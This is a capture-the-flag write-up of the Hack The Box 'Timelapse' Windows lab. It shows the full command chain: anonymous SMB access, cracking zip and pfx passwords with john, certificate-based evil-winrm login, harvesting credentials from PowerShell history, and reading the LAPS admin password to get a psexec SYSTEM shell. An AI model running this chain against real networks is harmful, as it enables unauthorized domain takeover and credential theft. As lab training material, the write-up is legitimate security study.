# Key Takeaways
- When working with password protected files, always check to see if a hash can be extracted (tools like x2john).
- If only port 5986 is available, don't forget that you likely need to include support for SSL when connecting.

# Overview
- Platform: Windows
- HTB Rating: Easy - Medium

### Vulnerabilities
- Sensitive files containing connection credentials can be accessed on a network share without any authentication necessary. These sensitive files should not be accessible on the network, and anonymous access should be removed.
- Credentials entered directly into the console persist within the PowerShell history file, allowed for escalation.

### Strengths
- LAPS is in use to facilitate automatic password rotation.

# Solving user.txt
This machine was begun with some basic nmap scans. It is found that the domain we are attacking here is likely `timelapse.htb`.
```
└──╼ $sudo nmap -sS -A -v -oA top1000 --top-ports 1000 10.129.227.113
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-01-19 10:46:47Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
```

```
└──╼ $sudo nmap -sS -oA allports -p- 10.129.227.113
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-18 21:49 EST
Nmap scan report for 10.129.227.113
Host is up (0.039s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49695/tcp open  unknown
60704/tcp open  unknown
```

Looking at the services available, I was initially interested in seeing if we could get more information from SMB (445) and DNS (53). DNS did not provide further useful information.
```
└──╼ $dig any timelapse.htb @10.129.227.113

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any timelapse.htb @10.129.227.113
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15589
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;timelapse.htb.                 IN      ANY

;; ANSWER SECTION:
timelapse.htb.          600     IN      A       10.129.227.113
timelapse.htb.          3600    IN      NS      dc01.timelapse.htb.
timelapse.htb.          3600    IN      SOA     dc01.timelapse.htb. hostmaster.timelapse.htb. 165 900 600 86400 3600
timelapse.htb.          600     IN      AAAA    dead:beef::d4b0:c7c2:6100:cbe8
timelapse.htb.          600     IN      AAAA    dead:beef::23b
timelapse.htb.          600     IN      AAAA    dead:beef::b5c6:f9aa:a6a6:3e26
timelapse.htb.          600     IN      AAAA    dead:beef::24e

;; ADDITIONAL SECTION:
dc01.timelapse.htb.     1200    IN      A       10.129.227.113
dc01.timelapse.htb.     1200    IN      AAAA    dead:beef::23b
dc01.timelapse.htb.     1200    IN      AAAA    dead:beef::d4b0:c7c2:6100:cbe8

;; Query time: 43 msec
;; SERVER: 10.129.227.113#53(10.129.227.113) (TCP)
;; WHEN: Sun Jan 18 21:52:45 EST 2026
;; MSG SIZE  rcvd: 308

└──╼ $dig axfr timelapse.htb @10.129.227.113

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr timelapse.htb @10.129.227.113
;; global options: +cmd
; Transfer failed.
```

I was able to anonymously list available shares.
```
└──╼ $smbclient -N -L \\\\10.129.227.113

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
```

As the "Shares" share is non-standard, I started my further enumeration there. There were multiple interesting files here, but I started by downloading the zip file at `\shares\Dev\winrm_backup.zip`.
```
└──╼ $smbclient -N \\\\10.129.227.113\\shares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1308485 blocks available
smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1308485 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (14.7 KiloBytes/sec) (average 14.7 KiloBytes/sec)
smb: \Dev\> cd ..\HelpDesk
smb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
```

I then tried to unzip the archive, but was stopped as it is password protected. It seems that it may contain a .pfx file.
```
└──╼ $unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

I then used `zip2john` to extract the password hash.
```
└──╼ $zip2john winrm_backup.zip > winrm_backup.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

I then used `john` alongside the `rockyou.txt` wordlist to attempt to crack the hash. This was successful and gives us the password to the zip archive: `supremelegacy`.
```
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2026-01-19 19:07) 2.127g/s 7390Kp/s 7390Kc/s 7390KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I was then able to unzip the archive and find that there is a .pfx file inside: `legacyy_dev_auth.pfx`. .pfx files contain a private and public key, but are also password protected. Knowing this, I then further ran this file through `pfx2john` and extracted the hash.
```
└──╼ $pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash
```

I then cracked that hash, revealing the password to the .pfx file is: `thuglegacy`.
```
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:45 DONE (2026-01-19 19:44) 0.02188g/s 70705p/s 70705c/s 70705C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Based on the nmap scan and the name of the zip archive, it seemed likely that would want to use our access to this public/private key for WinRM access. `evil-winrm` can use these keys as authentication. I then extracted the private and public keys using the password that was found.
```
└──╼ $openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

└──╼ $openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
Enter Import Password:
```

I then connected to the server using `evil-winrm` alongside the necessary flags to allow authentication via the public/private keys and SSL. This was successful, and I grabbed the `user.txt` flag from the Desktop of the `legacyy` user.
```
└──╼ $evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S -r timelapse.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy

*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/19/2026   2:44 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
99e53f46998a6b6c1a0a5399666bce08
```

# Solving root.txt
With initial access as a user, I began by checking some basic privileges, groups, and running BloodHound. While the current user didn't seem to have any super interesting privileges, I did notice that the `svc_deploy` account was apart of the LAPS Readers group. Local Administrator Password Solution (LAPS) is used to randomize and rotate the local admin passwords on Windows hosts. It is generally a good way to harden hosts against lateral movement by avoiding admin password re-use. That said, gaining access to a user account that is apart of the LAPS Readers group would allow us to read the local administrator password, making `svc_deploy` a good target.

<img width="1423" height="667" alt="image" src="https://github.com/user-attachments/assets/2005d918-2dda-4d66-b799-093d90d261ac" />

I then uploaded and ran [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS). Scrolling through the output of this tool, I found that a PowerShell history file existed for our user at: `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

I read this PowerShell history file, and it disclosed in plaintext the credentials for another user. We find the username `svc_deploy` and the password `E3R$Q62^12p7PLlC%KWaxuaV`.
```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

I verified that these credentials were still good via the tool Netexec. It was important to make sure the `$` within the password was properly escaped via backslash.
```
└──╼ $nxc smb 10.129.227.113 -u users.txt -p E3R\$Q62^12p7PLlC%KWaxuaV
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

Since we have a valid login, I then tried to gain access to the machine via WinRM keeping in mind that we need to use an encrypted connection to access port 5986.
```
└──╼ $evil-winrm -i 10.129.227.113 -u svc_deploy -p E3R\$Q62^12p7PLlC%KWaxuaV -S -r timelapse.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Warning: User is not needed for Kerberos auth. Ticket will be used

Warning: Password is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

I verified that this user was indeed in the LAPS Readers group as expected.
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

I then uploaded and utilized [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to take advantage of this access and read the local admin password.
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-DomainComputer -Identity "DC01" -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

ms-mcs-admpwdexpirationtime ms-mcs-admpwd
--------------------------- -------------
         134137250495955262 ]#mdOua0AyH]+$+t/$O[7+bk
```

With this admin password, I then connected to the machine via `psexec.py`.
```
└──╼ $psexec.py Administrator:']#mdOua0AyH]+$+t/$O[7+bk'@10.129.227.113
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.227.113.....
[*] Found writable share ADMIN$
[*] Uploading file SyQwMpcz.exe
[*] Opening SVCManager on 10.129.227.113.....
[*] Creating service RVor on 10.129.227.113.....
[*] Starting service RVor.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2686]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop> whoami
nt authority\system
```

I then located the `root.txt` flag within the TRX user's Desktop directory.
```
C:\Users\TRX\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

 Directory of C:\Users\TRX\Desktop

03/03/2022  10:45 PM    <DIR>          .
03/03/2022  10:45 PM    <DIR>          ..
01/19/2026  02:44 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,335,244,800 bytes free

C:\Users\TRX\Desktop> type root.txt
52285661498f2a4dcf01e0dea5b0ce7a
```
